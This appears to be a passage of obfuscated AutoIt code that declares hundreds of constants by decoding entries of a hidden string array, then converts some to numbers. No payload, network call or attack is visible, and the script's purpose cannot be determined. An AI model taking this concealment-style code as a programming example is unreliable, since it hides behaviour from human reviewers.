Global Const $vt0s0775 = ovt0sf($vt0s02f0[0]), $vt0s0776 = ovt0sf($vt0s02f0[1]), $vt0s0777 = ovt0sf($vt0s02f0[2]), $vt0s0778 = ovt0sf($vt0s02f0[3]), $vt0s0779 = ovt0sf($vt0s02f0[4]), $vt0s077a = ovt0sf($vt0s02f0[5]), $vt0s077b = ovt0sf($vt0s02f0[6]), $vt0s077c = ovt0sf($vt0s02f0[7]), $vt0s077d = ovt0sf($vt0s02f0[8]), $vt0s077e = ovt0sf($vt0s02f0[9]), $vt0s077f = ovt0sf($vt0s02f0[10]), $vt0s0780 = ovt0sf($vt0s02f0[11]), $vt0s0781 = ovt0sf($vt0s02f0[12]), $vt0s0782 = ovt0sf($vt0s02f0[13]), $vt0s0783 = ovt0sf($vt0s02f0[14]), $vt0s0784 = ovt0sf($vt0s02f0[15]), $vt0s0785 = ovt0sf($vt0s02f0[16]), $vt0s0786 = ovt0sf($vt0s02f0[17]), $vt0s0787 = ovt0sf($vt0s02f0[18]), $vt0s0788 = ovt0sf($vt0s02f0[19]), $vt0s0789 = ovt0sf($vt0s02f0[20]), $vt0s078a = ovt0sf($vt0s02f0[21]), $vt0s078b = ovt0sf($vt0s02f0[22]), $vt0s078c = ovt0sf($vt0s02f0[23]), $vt0s078d = ovt0sf($vt0s02f0[24]), $vt0s078e = ovt0sf($vt0s02f0[25]), $vt0s078f = ovt0sf($vt0s02f0[26]), $vt0s0790 = ovt0sf($vt0s02f0[27]), $vt0s0791 = ovt0sf($vt0s02f0[28]), $vt0s0792 = ovt0sf($vt0s02f0[29]), $vt0s0793 = ovt0sf($vt0s02f0[30]), $vt0s0794 = ovt0sf($vt0s02f0[31]), $vt0s0795 = ovt0sf($vt0s02f0[32]), $vt0s0796 = ovt0sf($vt0s02f0[33]), $vt0s0797 = ovt0sf($vt0s02f0[34]), $vt0s0798 = ovt0sf($vt0s02f0[35]), $vt0s0799 = ovt0sf($vt0s02f0[36]), $vt0s079a = ovt0sf($vt0s02f0[37]), $vt0s079b = ovt0sf($vt0s02f0[38]), $vt0s079c = ovt0sf($vt0s02f0[39]), $vt0s079d = ovt0sf($vt0s02f0[40]), $vt0s079e = ovt0sf($vt0s02f0[41]), $vt0s079f = ovt0sf($vt0s02f0[42]), $vt0s07a0 = ovt0sf($vt0s02f0[43]), $vt0s07a1 = ovt0sf($vt0s02f0[44]), $vt0s07a2 = ovt0sf($vt0s02f0[45]), $vt0s07a3 = ovt0sf($vt0s02f0[46]), $vt0s07a4 = ovt0sf($vt0s02f0[47]), $vt0s07a5 = ovt0sf($vt0s02f0[48]), $vt0s07a6 = ovt0sf($vt0s02f0[49]), $vt0s07a7 = ovt0sf($vt0s02f0[50]), $vt0s07a8 = ovt0sf($vt0s02f0[51]), $vt0s07a9 = ovt0sf($vt0s02f0[52]), $vt0s07aa = ovt0sf($vt0s02f0[53]), $vt0s07ab = ovt0sf($vt0s02f0[54]), $vt0s07ac = ovt0sf($vt0s02f0[55]), $vt0s07ad = ovt0sf($vt0s02f0[56]), $vt0s07ae = ovt0sf($vt0s02f0[57]), $vt0s07af = ovt0sf($vt0s02f0[58]), $vt0s07b0 = ovt0sf($vt0s02f0[59]), $vt0s07b1 = ovt0sf($vt0s02f0[60]), $vt0s07b2 = ovt0sf($vt0s02f0[61]), $vt0s07b3 = ovt0sf($vt0s02f0[62]), $vt0s07b4 = ovt0sf($vt0s02f0[63]), $vt0s07b5 = ovt0sf($vt0s02f0[64]), $vt0s07b6 = ovt0sf($vt0s02f0[65]), $vt0s07b7 = ovt0sf($vt0s02f0[66]), $vt0s07b8 = ovt0sf($vt0s02f0[67]), $vt0s07b9 = ovt0sf($vt0s02f0[68]), $vt0s07ba = ovt0sf($vt0s02f0[69]), $vt0s07bb = ovt0sf($vt0s02f0[70]), $vt0s07bc = ovt0sf($vt0s02f0[71]), $vt0s07bd = ovt0sf($vt0s02f0[72]), $vt0s07be = ovt0sf($vt0s02f0[73]), $vt0s07bf = ovt0sf($vt0s02f0[74]), $vt0s07c0 = ovt0sf($vt0s02f0[75]), $vt0s07c1 = ovt0sf($vt0s02f0[76]), $vt0s07c2 = ovt0sf($vt0s02f0[77]), $vt0s07c3 = ovt0sf($vt0s02f0[78]), $vt0s07c4 = ovt0sf($vt0s02f0[79]), $vt0s07c5 = ovt0sf($vt0s02f0[80]), $vt0s07c6 = ovt0sf($vt0s02f0[81]), $vt0s07c7 = ovt0sf($vt0s02f0[82]), $vt0s07c8 = ovt0sf($vt0s02f0[83]), $vt0s07c9 = ovt0sf($vt0s02f0[84]), $vt0s07ca = ovt0sf($vt0s02f0[85]), $vt0s07cb = ovt0sf($vt0s02f0[86]), $vt0s07cc = ovt0sf($vt0s02f0[87]), $vt0s07cd = ovt0sf($vt0s02f0[88]), $vt0s07ce = ovt0sf($vt0s02f0[89]), $vt0s07cf = ovt0sf($vt0s02f0[90]), $vt0s07d0 = ovt0sf($vt0s02f0[91]), $vt0s07d1 = ovt0sf($vt0s02f0[92]), $vt0s07d2 = ovt0sf($vt0s02f0[93]), $vt0s07d3 = ovt0sf($vt0s02f0[94]), $vt0s07d4 = ovt0sf($vt0s02f0[95]), $vt0s07d5 = ovt0sf($vt0s02f0[96]), $vt0s07d6 = ovt0sf($vt0s02f0[97]), $vt0s07d7 = ovt0sf($vt0s02f0[98]), $vt0s07d8 = ovt0sf($vt0s02f0[99]), $vt0s07d9 = ovt0sf($vt0s02f0[100]), $vt0s07da = ovt0sf($vt0s02f0[101]), $vt0s07db = ovt0sf($vt0s02f0[102]), $vt0s07dc = ovt0sf($vt0s02f0[103]), $vt0s07dd = ovt0sf($vt0s02f0[104]), $vt0s07de = ovt0sf($vt0s02f0[105]), $vt0s07df = ovt0sf($vt0s02f0[106]), $vt0s07e0 = ovt0sf($vt0s02f0[107]), $vt0s07e1 = ovt0sf($vt0s02f0[108]), $vt0s07e2 = ovt0sf($vt0s02f0[109]), $vt0s07e3 = ovt0sf($vt0s02f0[110])
Global Const $vt0s07e4 = ovt0sf($vt0s02f0[111]), $vt0s07e5 = ovt0sf($vt0s02f0[112]), $vt0s07e6 = ovt0sf($vt0s02f0[113]), $vt0s07e7 = ovt0sf($vt0s02f0[114]), $vt0s07e8 = ovt0sf($vt0s02f0[115]), $vt0s07e9 = ovt0sf($vt0s02f0[116]), $vt0s07ea = ovt0sf($vt0s02f0[117]), $vt0s07eb = ovt0sf($vt0s02f0[118]), $vt0s07ec = ovt0sf($vt0s02f0[119]), $vt0s07ed = ovt0sf($vt0s02f0[120]), $vt0s07ee = ovt0sf($vt0s02f0[121]), $vt0s07ef = ovt0sf($vt0s02f0[122]), $vt0s07f0 = ovt0sf($vt0s02f0[123]), $vt0s07f1 = ovt0sf($vt0s02f0[124]), $vt0s07f2 = ovt0sf($vt0s02f0[125]), $vt0s07f3 = ovt0sf($vt0s02f0[126]), $vt0s07f4 = ovt0sf($vt0s02f0[127]), $vt0s07f5 = ovt0sf($vt0s02f0[128]), $vt0s07f6 = ovt0sf($vt0s02f0[129]), $vt0s07f7 = ovt0sf($vt0s02f0[130]), $vt0s07f8 = ovt0sf($vt0s02f0[131]), $vt0s07f9 = ovt0sf($vt0s02f0[132]), $vt0s07fa = ovt0sf($vt0s02f0[133]), $vt0s07fb = ovt0sf($vt0s02f0[134]), $vt0s07fc = ovt0sf($vt0s02f0[135]), $vt0s07fd = ovt0sf($vt0s02f0[136]), $vt0s07fe = ovt0sf($vt0s02f0[137]), $vt0s07ff = ovt0sf($vt0s02f0[138]), $vt0s0800 = ovt0sf($vt0s02f0[139]), $vt0s0801 = ovt0sf($vt0s02f0[140]), $vt0s0802 = ovt0sf($vt0s02f0[141]), $vt0s0803 = ovt0sf($vt0s02f0[142]), $vt0s0804 = ovt0sf($vt0s02f0[143]), $vt0s0805 = ovt0sf($vt0s02f0[144]), $vt0s0806 = ovt0sf($vt0s02f0[145]), $vt0s0807 = ovt0sf($vt0s02f0[146]), $vt0s0808 = ovt0sf($vt0s02f0[147]), $vt0s0809 = ovt0sf($vt0s02f0[148]), $vt0s080a = ovt0sf($vt0s02f0[149]), $vt0s080b = ovt0sf($vt0s02f0[150]), $vt0s080c = ovt0sf($vt0s02f0[151]), $vt0s080d = ovt0sf($vt0s02f0[152]), $vt0s080e = ovt0sf($vt0s02f0[153]), $vt0s080f = ovt0sf($vt0s02f0[154]), $vt0s0810 = ovt0sf($vt0s02f0[155]), $vt0s0811 = ovt0sf($vt0s02f0[156]), $vt0s0812 = ovt0sf($vt0s02f0[157]), $vt0s0813 = ovt0sf($vt0s02f0[158]), $vt0s0814 = ovt0sf($vt0s02f0[159]), $vt0s0815 = ovt0sf($vt0s02f0[160]), $vt0s0816 = ovt0sf($vt0s02f0[161]), $vt0s0817 = ovt0sf($vt0s02f0[162]), $vt0s0818 = ovt0sf($vt0s02f0[163]), $vt0s0819 = ovt0sf($vt0s02f0[164]), $vt0s081a = ovt0sf($vt0s02f0[165]), $vt0s081b = ovt0sf($vt0s02f0[166]), $vt0s081c = ovt0sf($vt0s02f0[167]), $vt0s081d = ovt0sf($vt0s02f0[168]), $vt0s081e = ovt0sf($vt0s02f0[169]), $vt0s081f = ovt0sf($vt0s02f0[170]), $vt0s0820 = ovt0sf($vt0s02f0[171]), $vt0s0821 = ovt0sf($vt0s02f0[172]), $vt0s0822 = ovt0sf($vt0s02f0[173]), $vt0s0823 = ovt0sf($vt0s02f0[174]), $vt0s0824 = ovt0sf($vt0s02f0[175]), $vt0s0825 = ovt0sf($vt0s02f0[176]), $vt0s0826 = ovt0sf($vt0s02f0[177]), $vt0s0827 = ovt0sf($vt0s02f0[178]), $vt0s0828 = ovt0sf($vt0s02f0[179]), $vt0s0829 = ovt0sf($vt0s02f0[180]), $vt0s082a = ovt0sf($vt0s02f0[181]), $vt0s082b = ovt0sf($vt0s02f0[182]), $vt0s082c = ovt0sf($vt0s02f0[183]), $vt0s082d = ovt0sf($vt0s02f0[184]), $vt0s082e = ovt0sf($vt0s02f0[185]), $vt0s082f = ovt0sf($vt0s02f0[186]), $vt0s0830 = ovt0sf($vt0s02f0[187]), $vt0s0831 = ovt0sf($vt0s02f0[188]), $vt0s0832 = ovt0sf($vt0s02f0[189]), $vt0s0833 = ovt0sf($vt0s02f0[190]), $vt0s0834 = ovt0sf($vt0s02f0[191]), $vt0s0835 = ovt0sf($vt0s02f0[192]), $vt0s0836 = ovt0sf($vt0s02f0[193]), $vt0s0837 = ovt0sf($vt0s02f0[194]), $vt0s0838 = ovt0sf($vt0s02f0[195]), $vt0s0839 = ovt0sf($vt0s02f0[196]), $vt0s083a = ovt0sf($vt0s02f0[197]), $vt0s083b = ovt0sf($vt0s02f0[198]), $vt0s083c = ovt0sf($vt0s02f0[199]), $vt0s083d = ovt0sf($vt0s02f0[200]), $vt0s083e = ovt0sf($vt0s02f0[201]), $vt0s083f = ovt0sf($vt0s02f0[202]), $vt0s0840 = ovt0sf($vt0s02f0[203]), $vt0s0841 = ovt0sf($vt0s02f0[204]), $vt0s0842 = ovt0sf($vt0s02f0[205]), $vt0s0843 = ovt0sf($vt0s02f0[206]), $vt0s0844 = ovt0sf($vt0s02f0[207]), $vt0s0845 = ovt0sf($vt0s02f0[208]), $vt0s0846 = ovt0sf($vt0s02f0[209]), $vt0s0847 = ovt0sf($vt0s02f0[210]), $vt0s0848 = ovt0sf($vt0s02f0[211]), $vt0s0849 = ovt0sf($vt0s02f0[212]), $vt0s084a = ovt0sf($vt0s02f0[213]), $vt0s084b = ovt0sf($vt0s02f0[214]), $vt0s084c = ovt0sf($vt0s02f0[215]), $vt0s084d = ovt0sf($vt0s02f0[216]), $vt0s084e = ovt0sf($vt0s02f0[217]), $vt0s084f = ovt0sf($vt0s02f0[218]), $vt0s0850 = ovt0sf($vt0s02f0[219]), $vt0s0851 = ovt0sf($vt0s02f0[220]), $vt0s0852 = ovt0sf($vt0s02f0[221])
Global Const $vt0s0853 = ovt0sf($vt0s02f0[222]), $vt0s0854 = ovt0sf($vt0s02f0[223]), $vt0s0855 = ovt0sf($vt0s02f0[224]), $vt0s0856 = ovt0sf($vt0s02f0[225]), $vt0s0857 = ovt0sf($vt0s02f0[226]), $vt0s0858 = ovt0sf($vt0s02f0[227]), $vt0s0859 = ovt0sf($vt0s02f0[228]), $vt0s085a = ovt0sf($vt0s02f0[229]), $vt0s085b = ovt0sf($vt0s02f0[230]), $vt0s085c = ovt0sf($vt0s02f0[231]), $vt0s085d = ovt0sf($vt0s02f0[232]), $vt0s085e = ovt0sf($vt0s02f0[233]), $vt0s085f = ovt0sf($vt0s02f0[234]), $vt0s0860 = ovt0sf($vt0s02f0[235]), $vt0s0861 = ovt0sf($vt0s02f0[236]), $vt0s0862 = ovt0sf($vt0s02f0[237]), $vt0s0863 = ovt0sf($vt0s02f0[238]), $vt0s0864 = ovt0sf($vt0s02f0[239]), $vt0s0865 = ovt0sf($vt0s02f0[240]), $vt0s0866 = ovt0sf($vt0s02f0[241]), $vt0s0867 = ovt0sf($vt0s02f0[242]), $vt0s0868 = ovt0sf($vt0s02f0[243]), $vt0s0869 = ovt0sf($vt0s02f0[244]), $vt0s086a = ovt0sf($vt0s02f0[245]), $vt0s086b = ovt0sf($vt0s02f0[246]), $vt0s086c = ovt0sf($vt0s02f0[247]), $vt0s086d = ovt0sf($vt0s02f0[248]), $vt0s086e = ovt0sf($vt0s02f0[249]), $vt0s086f = ovt0sf($vt0s02f0[250]), $vt0s0870 = ovt0sf($vt0s02f0[251]), $vt0s0871 = ovt0sf($vt0s02f0[252]), $vt0s0872 = ovt0sf($vt0s02f0[253]), $vt0s0873 = ovt0sf($vt0s02f0[254]), $vt0s0874 = ovt0sf($vt0s02f0[255]), $vt0s0875 = ovt0sf($vt0s02f0[256]), $vt0s0876 = ovt0sf($vt0s02f0[257]), $vt0s0877 = ovt0sf($vt0s02f0[258]), $vt0s0878 = ovt0sf($vt0s02f0[259]), $vt0s0879 = ovt0sf($vt0s02f0[260]), $vt0s087a = ovt0sf($vt0s02f0[261]), $vt0s087b = ovt0sf($vt0s02f0[262]), $vt0s087c = ovt0sf($vt0s02f0[263]), $vt0s087d = ovt0sf($vt0s02f0[264]), $vt0s087e = ovt0sf($vt0s02f0[265]), $vt0s087f = ovt0sf($vt0s02f0[266]), $vt0s0880 = ovt0sf($vt0s02f0[267]), $vt0s0881 = ovt0sf($vt0s02f0[268]), $vt0s0882 = ovt0sf($vt0s02f0[269]), $vt0s0883 = ovt0sf($vt0s02f0[270]), $vt0s0884 = ovt0sf($vt0s02f0[271]), $vt0s0885 = ovt0sf($vt0s02f0[272]), $vt0s0886 = ovt0sf($vt0s02f0[273]), $vt0s0887 = ovt0sf($vt0s02f0[274]), $vt0s0888 = ovt0sf($vt0s02f0[275]), $vt0s0889 = ovt0sf($vt0s02f0[276]), $vt0s088a = ovt0sf($vt0s02f0[277]), $vt0s088b = ovt0sf($vt0s02f0[278]), $vt0s088c = ovt0sf($vt0s02f0[279]), $vt0s088d = ovt0sf($vt0s02f0[280]), $vt0s088e = ovt0sf($vt0s02f0[281]), $vt0s088f = ovt0sf($vt0s02f0[282]), $vt0s0890 = ovt0sf($vt0s02f0[283]), $vt0s0891 = ovt0sf($vt0s02f0[284]), $vt0s0892 = ovt0sf($vt0s02f0[285]), $vt0s0893 = ovt0sf($vt0s02f0[286]), $vt0s0894 = ovt0sf($vt0s02f0[287]), $vt0s0895 = ovt0sf($vt0s02f0[288]), $vt0s0896 = ovt0sf($vt0s02f0[289]), $vt0s0897 = ovt0sf($vt0s02f0[290]), $vt0s0898 = ovt0sf($vt0s02f0[291]), $vt0s0899 = ovt0sf($vt0s02f0[292]), $vt0s089a = ovt0sf($vt0s02f0[293]), $vt0s089b = ovt0sf($vt0s02f0[294]), $vt0s089c = ovt0sf($vt0s02f0[295]), $vt0s089d = ovt0sf($vt0s02f0[296]), $vt0s089e = ovt0sf($vt0s02f0[297]), $vt0s089f = ovt0sf($vt0s02f0[298]), $vt0s08a0 = ovt0sf($vt0s02f0[299]), $vt0s08a1 = ovt0sf($vt0s02f0[300]), $vt0s08a2 = ovt0sf($vt0s02f0[301]), $vt0s08a3 = ovt0sf($vt0s02f0[302]), $vt0s08a4 = ovt0sf($vt0s02f0[303]), $vt0s08a5 = ovt0sf($vt0s02f0[304]), $vt0s08a6 = ovt0sf($vt0s02f0[305]), $vt0s08a7 = ovt0sf($vt0s02f0[306]), $vt0s08a8 = ovt0sf($vt0s02f0[307]), $vt0s08a9 = ovt0sf($vt0s02f0[308]), $vt0s08aa = ovt0sf($vt0s02f0[309]), $vt0s08ab = ovt0sf($vt0s02f0[310]), $vt0s08ac = ovt0sf($vt0s02f0[311]), $vt0s08ad = ovt0sf($vt0s02f0[312]), $vt0s08ae = ovt0sf($vt0s02f0[313]), $vt0s08af = ovt0sf($vt0s02f0[314]), $vt0s08b0 = ovt0sf($vt0s02f0[315]), $vt0s08b1 = ovt0sf($vt0s02f0[316]), $vt0s08b2 = ovt0sf($vt0s02f0[317]), $vt0s08b3 = ovt0sf($vt0s02f0[318]), $vt0s08b4 = ovt0sf($vt0s02f0[319]), $vt0s08b5 = ovt0sf($vt0s02f0[320]), $vt0s08b6 = ovt0sf($vt0s02f0[321]), $vt0s08b7 = ovt0sf($vt0s02f0[322]), $vt0s08b8 = ovt0sf($vt0s02f0[323]), $vt0s08b9 = ovt0sf($vt0s02f0[324]), $vt0s08ba = ovt0sf($vt0s02f0[325]), $vt0s08bb = ovt0sf($vt0s02f0[326]), $vt0s08bc = ovt0sf($vt0s02f0[327]), $vt0s08bd = ovt0sf($vt0s02f0[328]), $vt0s08be = ovt0sf($vt0s02f0[329]), $vt0s08bf = ovt0sf($vt0s02f0[330]), $vt0s08c0 = ovt0sf($vt0s02f0[331]), $vt0s08c1 = ovt0sf($vt0s02f0[332])
Global Const $vt0s08c2 = ovt0sf($vt0s02f0[333]), $vt0s08c3 = ovt0sf($vt0s02f0[334]), $vt0s08c4 = ovt0sf($vt0s02f0[335]), $vt0s08c5 = ovt0sf($vt0s02f0[336]), $vt0s08c6 = ovt0sf($vt0s02f0[337]), $vt0s08c7 = ovt0sf($vt0s02f0[338]), $vt0s08c8 = ovt0sf($vt0s02f0[339]), $vt0s08c9 = ovt0sf($vt0s02f0[340]), $vt0s08ca = ovt0sf($vt0s02f0[341]), $vt0s08cb = ovt0sf($vt0s02f0[342]), $vt0s08cc = ovt0sf($vt0s02f0[343]), $vt0s08cd = ovt0sf($vt0s02f0[344]), $vt0s08ce = ovt0sf($vt0s02f0[345]), $vt0s08cf = ovt0sf($vt0s02f0[346]), $vt0s08d0 = ovt0sf($vt0s02f0[347]), $vt0s08d1 = ovt0sf($vt0s02f0[348]), $vt0s08d2 = ovt0sf($vt0s02f0[349]), $vt0s08d3 = ovt0sf($vt0s02f0[350]), $vt0s08d4 = ovt0sf($vt0s02f0[351]), $vt0s08d5 = ovt0sf($vt0s02f0[352]), $vt0s08d6 = ovt0sf($vt0s02f0[353]), $vt0s08d7 = ovt0sf($vt0s02f0[354]), $vt0s08d8 = ovt0sf($vt0s02f0[355]), $vt0s08d9 = ovt0sf($vt0s02f0[356]), $vt0s08da = ovt0sf($vt0s02f0[357]), $vt0s08db = ovt0sf($vt0s02f0[358]), $vt0s08dc = ovt0sf($vt0s02f0[359]), $vt0s08dd = ovt0sf($vt0s02f0[360]), $vt0s08de = ovt0sf($vt0s02f0[361]), $vt0s08df = ovt0sf($vt0s02f0[362]), $vt0s08e0 = ovt0sf($vt0s02f0[363]), $vt0s08e1 = ovt0sf($vt0s02f0[364]), $vt0s08e2 = ovt0sf($vt0s02f0[365]), $vt0s08e3 = ovt0sf($vt0s02f0[366]), $vt0s08e4 = ovt0sf($vt0s02f0[367]), $vt0s08e5 = ovt0sf($vt0s02f0[368]), $vt0s08e6 = ovt0sf($vt0s02f0[369]), $vt0s08e7 = ovt0sf($vt0s02f0[370]), $vt0s08e8 = ovt0sf($vt0s02f0[371]), $vt0s08e9 = ovt0sf($vt0s02f0[372]), $vt0s08ea = ovt0sf($vt0s02f0[373]), $vt0s08eb = ovt0sf($vt0s02f0[374]), $vt0s08ec = ovt0sf($vt0s02f0[375]), $vt0s08ed = ovt0sf($vt0s02f0[376]), $vt0s08ee = ovt0sf($vt0s02f0[377]), $vt0s08ef = ovt0sf($vt0s02f0[378]), $vt0s08f0 = ovt0sf($vt0s02f0[379]), $vt0s08f1 = ovt0sf($vt0s02f0[380]), $vt0s08f2 = ovt0sf($vt0s02f0[381]), $vt0s08f3 = ovt0sf($vt0s02f0[382]), $vt0s08f4 = ovt0sf($vt0s02f0[383]), $vt0s08f5 = ovt0sf($vt0s02f0[384]), $vt0s08f6 = ovt0sf($vt0s02f0[385]), $vt0s08f7 = ovt0sf($vt0s02f0[386]), $vt0s08f8 = ovt0sf($vt0s02f0[387]), $vt0s08f9 = ovt0sf($vt0s02f0[388]), $vt0s08fa = ovt0sf($vt0s02f0[389]), $vt0s08fb = ovt0sf($vt0s02f0[390]), $vt0s08fc = ovt0sf($vt0s02f0[391]), $vt0s08fd = ovt0sf($vt0s02f0[392]), $vt0s08fe = ovt0sf($vt0s02f0[393]), $vt0s08ff = ovt0sf($vt0s02f0[394]), $vt0s0900 = ovt0sf($vt0s02f0[395]), $vt0s0901 = ovt0sf($vt0s02f0[396]), $vt0s0902 = ovt0sf($vt0s02f0[397]), $vt0s0903 = ovt0sf($vt0s02f0[398]), $vt0s0904 = ovt0sf($vt0s02f0[399]), $vt0s0905 = ovt0sf($vt0s02f0[400]), $vt0s0906 = ovt0sf($vt0s02f0[401]), $vt0s0907 = ovt0sf($vt0s02f0[402]), $vt0s0908 = ovt0sf($vt0s02f0[403]), $vt0s0909 = ovt0sf($vt0s02f0[404]), $vt0s090a = ovt0sf($vt0s02f0[405]), $vt0s090b = ovt0sf($vt0s02f0[406]), $vt0s090c = ovt0sf($vt0s02f0[407]), $vt0s090d = ovt0sf($vt0s02f0[408]), $vt0s090e = ovt0sf($vt0s02f0[409]), $vt0s090f = ovt0sf($vt0s02f0[410]), $vt0s0910 = ovt0sf($vt0s02f0[411]), $vt0s0911 = ovt0sf($vt0s02f0[412]), $vt0s0912 = ovt0sf($vt0s02f0[413]), $vt0s0913 = ovt0sf($vt0s02f0[414]), $vt0s0914 = ovt0sf($vt0s02f0[415]), $vt0s0915 = ovt0sf($vt0s02f0[416]), $vt0s0916 = ovt0sf($vt0s02f0[417]), $vt0s0917 = ovt0sf($vt0s02f0[418]), $vt0s0918 = ovt0sf($vt0s02f0[419]), $vt0s0919 = ovt0sf($vt0s02f0[420]), $vt0s091a = ovt0sf($vt0s02f0[421]), $vt0s091b = ovt0sf($vt0s02f0[422]), $vt0s091c = ovt0sf($vt0s02f0[423]), $vt0s091d = ovt0sf($vt0s02f0[424]), $vt0s091e = ovt0sf($vt0s02f0[425]), $vt0s091f = ovt0sf($vt0s02f0[426]), $vt0s0920 = ovt0sf($vt0s02f0[427]), $vt0s0921 = ovt0sf($vt0s02f0[428]), $vt0s0922 = ovt0sf($vt0s02f0[429]), $vt0s0923 = ovt0sf($vt0s02f0[430]), $vt0s0924 = ovt0sf($vt0s02f0[431]), $vt0s0925 = ovt0sf($vt0s02f0[432]), $vt0s0926 = ovt0sf($vt0s02f0[433]), $vt0s0927 = ovt0sf($vt0s02f0[434]), $vt0s0928 = ovt0sf($vt0s02f0[435]), $vt0s0929 = ovt0sf($vt0s02f0[436]), $vt0s092a = ovt0sf($vt0s02f0[437]), $vt0s092b = ovt0sf($vt0s02f0[438]), $vt0s092c = ovt0sf($vt0s02f0[439]), $vt0s092d = ovt0sf($vt0s02f0[440]), $vt0s092e = ovt0sf($vt0s02f0[441]), $vt0s092f = ovt0sf($vt0s02f0[442]), $vt0s0930 = ovt0sf($vt0s02f0[443])
Global Const $vt0s0931 = ovt0sf($vt0s02f0[444]), $vt0s0932 = ovt0sf($vt0s02f0[445]), $vt0s0933 = ovt0sf($vt0s02f0[446]), $vt0s0934 = ovt0sf($vt0s02f0[447]), $vt0s0935 = ovt0sf($vt0s02f0[448]), $vt0s0936 = ovt0sf($vt0s02f0[449]), $vt0s0937 = ovt0sf($vt0s02f0[450]), $vt0s0938 = ovt0sf($vt0s02f0[451]), $vt0s0939 = ovt0sf($vt0s02f0[452]), $vt0s093a = ovt0sf($vt0s02f0[453]), $vt0s093b = ovt0sf($vt0s02f0[454]), $vt0s093c = ovt0sf($vt0s02f0[455]), $vt0s093d = ovt0sf($vt0s02f0[456]), $vt0s093e = ovt0sf($vt0s02f0[457]), $vt0s093f = ovt0sf($vt0s02f0[458]), $vt0s0940 = ovt0sf($vt0s02f0[459]), $vt0s0941 = ovt0sf($vt0s02f0[460]), $vt0s0942 = ovt0sf($vt0s02f0[461]), $vt0s0943 = ovt0sf($vt0s02f0[462]), $vt0s0944 = ovt0sf($vt0s02f0[463]), $vt0s0945 = ovt0sf($vt0s02f0[464]), $vt0s0946 = ovt0sf($vt0s02f0[465]), $vt0s0947 = ovt0sf($vt0s02f0[466]), $vt0s0948 = ovt0sf($vt0s02f0[467]), $vt0s0949 = ovt0sf($vt0s02f0[468]), $vt0s094a = ovt0sf($vt0s02f0[469]), $vt0s094b = ovt0sf($vt0s02f0[470]), $vt0s094c = ovt0sf($vt0s02f0[471]), $vt0s094d = ovt0sf($vt0s02f0[472]), $vt0s094e = ovt0sf($vt0s02f0[473]), $vt0sz0775 = Number($vt0s0775), $vt0sz078d = Number($vt0s078d), $vt0sz078e = Number($vt0s078e), $vt0sz078f = Number($vt0s078f), $vt0sz0790 = Number($vt0s0790), $vt0sz0791 = Number($vt0s0791), $vt0sz0792 = Number($vt0s0792), $vt0sz0795 = Number($vt0s0795), $vt0sz0799 = Number($vt0s0799), $vt0sz079e = Number($vt0s079e), $vt0sz079f = Number($vt0s079f), $vt0sz07a0 = Number($vt0s07a0), $vt0sz07a4 = Number($vt0s07a4), $vt0sz07a7 = Number($vt0s07a7), $vt0sz07a8 = Number($vt0s07a8), $vt0sz07a9 = Number($vt0s07a9), $vt0sz07aa = Number($vt0s07aa), $vt0sz07ad = Number($vt0s07ad), $vt0sz07ae = Number($vt0s07ae), $vt0sz07b9 = Number($vt0s07b9), $vt0sz07c1 = Number($vt0s07c1), $vt0sz07c2 = Number($vt0s07c2), $vt0sz07c4 = Number($vt0s07c4), $vt0sz07ca = Number($vt0s07ca), $vt0sz07cc = Number($vt0s07cc), $vt0sz07cd = Number($vt0s07cd), $vt0sz07d0 = Number($vt0s07d0), $vt0sz07d1 = Number($vt0s07d1), $vt0sz07d2 = Number($vt0s07d2), $vt0sz07d4 = Number($vt0s07d4), $vt0sz07d6 = Number($vt0s07d6), $vt0sz07d7 = Number($vt0s07d7), $vt0sz07d8 = Number($vt0s07d8), $vt0sz07dc = Number($vt0s07dc), $vt0sz07dd = Number($vt0s07dd), $vt0sz07de = Number($vt0s07de), $vt0sz07e0 = Number($vt0s07e0), $vt0sz07e1 = Number($vt0s07e1), $vt0sz07e2 = Number($vt0s07e2), $vt0sz07e3 = Number($vt0s07e3), $vt0sz07e5 = Number($vt0s07e5), $vt0sz07e7 = Number($vt0s07e7), $vt0sz07eb = Number($vt0s07eb), $vt0sz07ec = Number($vt0s07ec), $vt0sz07ed = Number($vt0s07ed), $vt0sz07ee = Number($vt0s07ee), $vt0sz07f0 = Number($vt0s07f0), $vt0sz07f1 = Number($vt0s07f1), $vt0sz07f2 = Number($vt0s07f2), $vt0sz07f6 = Number($vt0s07f6), $vt0sz07f7 = Number($vt0s07f7), $vt0sz07f8 = Number($vt0s07f8), $vt0sz07fc = Number($vt0s07fc), $vt0sz07fd = Number($vt0s07fd), $vt0sz07fe = Number($vt0s07fe), $vt0sz0801 = Number($vt0s0801), $vt0sz0802 = Number($vt0s0802), $vt0sz0803 = Number($vt0s0803), $vt0sz0805 = Number($vt0s0805), $vt0sz0807 = Number($vt0s0807), $vt0sz0808 = Number($vt0s0808), $vt0sz080b = Number($vt0s080b), $vt0sz080c = Number($vt0s080c), $vt0sz080d = Number($vt0s080d), $vt0sz080f = Number($vt0s080f), $vt0sz0810 = Number($vt0s0810), $vt0sz0811 = Number($vt0s0811), $vt0sz0813 = Number($vt0s0813), $vt0sz0815 = Number($vt0s0815), $vt0sz0816 = Number($vt0s0816), $vt0sz081a = Number($vt0s081a), $vt0sz081b = Number($vt0s081b), $vt0sz081c = Number($vt0s081c), $vt0sz081d = Number($vt0s081d), $vt0sz081e = Number($vt0s081e), $vt0sz081f = Number($vt0s081f), $vt0sz0820 = Number($vt0s0820), $vt0sz0821 = Number($vt0s0821), $vt0sz0822 = Number($vt0s0822), $vt0sz0823 = Number($vt0s0823), $vt0sz0824 = Number($vt0s0824), $vt0sz0825 = Number($vt0s0825), $vt0sz0827 = Number($vt0s0827), $vt0sz0829 = Number($vt0s0829), $vt0sz082e = Number($vt0s082e), $vt0sz082f = Number($vt0s082f), $vt0sz0830 = Number($vt0s0830), $vt0sz0831 = Number($vt0s0831), $vt0sz0832 = Number($vt0s0832), $vt0sz0833 = Number($vt0s0833), $vt0sz0834 = Number($vt0s0834), $vt0sz0835 = Number($vt0s0835), $vt0sz0836 = Number($vt0s0836), $vt0sz0838 = Number($vt0s0838), $vt0sz083a = Number($vt0s083a), $vt0sz083b = Number($vt0s083b), $vt0sz083e = Number($vt0s083e), $vt0sz083f = Number($vt0s083f), $vt0sz0840 = Number($vt0s0840), $vt0sz0841 = Number($vt0s0841)
